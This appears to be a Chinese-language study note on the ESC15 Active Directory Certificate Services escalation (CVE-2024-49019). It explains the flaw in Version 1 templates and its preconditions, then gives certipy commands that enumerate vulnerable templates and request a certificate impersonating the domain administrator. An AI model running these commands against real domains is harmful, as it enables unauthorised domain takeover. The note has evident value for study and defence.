# ESC15

## 介绍

ESC15（ADCS Escalation Screnario 15，攻击者用低权限账号请求证书时，能注入任意Application Policies（微软专有EKU扩展，OID1.3.6.1.4.1.311.xxx），CA不验证直接接受，导致证书获得额外权限（如Client Authentication），用于Kerberos认证伪装域管）

## 原理

### 正常流程

证书请求(CSR)中,CA会强制使用模板定义EKU（Extended Key Usage，如Server Authentication）

### 漏洞bug

在Schema Version模板下，CA忽略模板EKU，优先接受请求者注入的Application Policies（微软隐藏扩展）

（1）攻击者注入“Client Authentication”（OID：1.3.6.1.4.1.311.21.8）->证书可用域认证

（2）或注入“Certificate Request Agent”->on-behalf-of请求其他用户证书。

### 为什么只影响V1模板

Version1是旧版，默认不可自定义EKU；Version 2+（复制模板生成）已修复验证逻辑

### 与ESC1比较

ESC1需模板误配（有Client Auth EKU + Enrolle Supplies Subject）；ESC15即使模板无Client Auth，也能强制注入

## 利用条件

（1）攻击者有Enrollment权限的Schema Version 1模板（常见 WebServer）

（2）模板启用Enrollee Supplies Subject（请求者提供Subject，默认开）

（3）CA未打2024年11月补丁（CVE-2024-49019）

（4）常见漏洞模板：WebServer、User、Machine等默认V1模板

## 利用步骤

### 1）枚举

```
certipy find -u 'user@domain' -p 'pass' -dc-ip 'DC_IP' -vulnerable
```

输出标记ESC15漏洞模板

### 2）注入Client Auth直接提权

```
certipy req -u 'user@domain' -p 'pass' -ca 'CA_NAME' -template 'WebServer' -upn 'administrator@domain' -application-policies 'Client Authentication'
```

